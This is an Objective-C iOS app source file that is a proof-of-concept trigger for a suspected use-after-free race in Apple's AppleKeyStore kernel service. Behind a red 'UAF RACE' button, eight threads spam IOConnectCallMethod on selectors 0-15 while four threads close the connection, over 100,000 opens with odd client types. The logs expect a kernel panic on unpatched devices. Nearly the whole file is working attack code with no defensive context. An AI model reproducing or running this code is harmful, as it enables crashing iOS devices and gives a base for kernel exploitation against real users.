#import "ViewController.h"
#import <IOKit/IOKitLib.h>
#import <mach/mach.h>
#import <pthread.h>
#import <stdatomic.h>

#define AKS_SERVICE_NAME "AppleKeyStore"
#define NUM_CALLERS 8
#define NUM_CLOSERS 4
#define NUM_ITERATIONS 100000

static mach_port_t g_master_port = MACH_PORT_NULL;
static _Atomic(io_connect_t) g_conn = IO_OBJECT_NULL;
static atomic_bool g_done = false;
static atomic_uint g_calls = 0;
static atomic_uint g_closes = 0;
static atomic_uint g_opens = 0;

static void *caller_thread(void *arg) {
    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);

    uint64_t scalars[6] = {1, 0, 0, 0x10, 0, 0};

    while (!atomic_load(&g_done)) {
        io_connect_t conn = atomic_load(&g_conn);
        if (conn == IO_OBJECT_NULL) continue;

        for (uint32_t sel = 0; sel < 16; sel++) {
            IOConnectCallMethod(conn, sel, scalars, 6, NULL, 0, NULL, NULL, NULL, NULL);
            atomic_fetch_add(&g_calls, 1);
        }
    }
    return NULL;
}

static void *closer_thread(void *arg) {
    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);

    while (!atomic_load(&g_done)) {
        io_connect_t conn = atomic_load(&g_conn);
        if (conn == IO_OBJECT_NULL) continue;

        IOServiceClose(conn);
        atomic_store(&g_conn, IO_OBJECT_NULL);
        atomic_fetch_add(&g_closes, 1);
    }
    return NULL;
}

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = [UIColor blackColor];
    IOMainPort(MACH_PORT_NULL, &g_master_port);

    UIButton *btn = [UIButton buttonWithType:UIButtonTypeSystem];
    btn.frame = CGRectMake(40, self.view.bounds.size.height/2 - 40, self.view.bounds.size.width - 80, 80);
    [btn setTitle:@"UAF RACE" forState:UIControlStateNormal];
    [btn setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    btn.backgroundColor = [UIColor redColor];
    btn.layer.cornerRadius = 10;
    btn.titleLabel.font = [UIFont boldSystemFontOfSize:28];
    [btn addTarget:self action:@selector(triggerUAFRace) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:btn];

    UILabel *label = [[UILabel alloc] initWithFrame:CGRectMake(40, self.view.bounds.size.height/2 + 45, self.view.bounds.size.width - 80, 80)];
    label.text = @"8 callers + 4 closers race\n100k connections, no delay\nClient types: 0x2022/0xbeef/0x1337/0x4141";
    label.textColor = [UIColor grayColor];
    label.font = [UIFont systemFontOfSize:12];
    label.textAlignment = NSTextAlignmentCenter;
    label.numberOfLines = 4;
    [self.view addSubview:label];
}

- (void)triggerUAFRace {
    NSLog(@"[UAF RACE] Starting AppleKeyStore UAF race condition");
    NSLog(@"[UAF RACE] %d callers, %d closers, %d iterations", NUM_CALLERS, NUM_CLOSERS, NUM_ITERATIONS);

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
        io_service_t svc = IOServiceGetMatchingService(g_master_port, IOServiceMatching(AKS_SERVICE_NAME));
        if (!svc) {
            NSLog(@"[UAF RACE] AppleKeyStore service not found!");
            return;
        }
        NSLog(@"[UAF RACE] AppleKeyStore service found");

        atomic_store(&g_done, false);
        atomic_store(&g_conn, IO_OBJECT_NULL);
        atomic_store(&g_calls, 0);
        atomic_store(&g_closes, 0);
        atomic_store(&g_opens, 0);

        pthread_t callers[NUM_CALLERS];
        pthread_t closers[NUM_CLOSERS];

        for (int i = 0; i < NUM_CALLERS; i++) {
            pthread_create(&callers[i], NULL, caller_thread, NULL);
        }
        for (int i = 0; i < NUM_CLOSERS; i++) {
            pthread_create(&closers[i], NULL, closer_thread, NULL);
        }

        NSLog(@"[UAF RACE] Spawned %d callers + %d closers, starting %d connections...",
              NUM_CALLERS, NUM_CLOSERS, NUM_ITERATIONS);

        for (int i = 0; i < NUM_ITERATIONS; i++) {
            uint32_t type = (i % 4 == 0) ? 0x2022 :
                            (i % 4 == 1) ? 0xbeef :
                            (i % 4 == 2) ? 0x1337 : 0x4141;

            io_connect_t conn = IO_OBJECT_NULL;
            IOServiceOpen(svc, mach_task_self(), type, &conn);
            atomic_store(&g_conn, conn);
            atomic_fetch_add(&g_opens, 1);

            if ((i + 1) % 10000 == 0) {
                NSLog(@"[UAF RACE] Progress: %d/%d opens=%u calls=%u closes=%u",
                      i + 1, NUM_ITERATIONS,
                      atomic_load(&g_opens),
                      atomic_load(&g_calls),
                      atomic_load(&g_closes));
            }
        }

        atomic_store(&g_done, true);

        for (int i = 0; i < NUM_CALLERS; i++) {
            pthread_join(callers[i], NULL);
        }
        for (int i = 0; i < NUM_CLOSERS; i++) {
            pthread_join(closers[i], NULL);
        }

        io_connect_t final_conn = atomic_load(&g_conn);
        if (final_conn != IO_OBJECT_NULL) {
            IOServiceClose(final_conn);
        }
        IOObjectRelease(svc);

        NSLog(@"[UAF RACE] Done. opens=%u calls=%u closes=%u",
              atomic_load(&g_opens), atomic_load(&g_calls), atomic_load(&g_closes));
        NSLog(@"[UAF RACE] If no panic, device may be patched or try again");
    });
}

@end
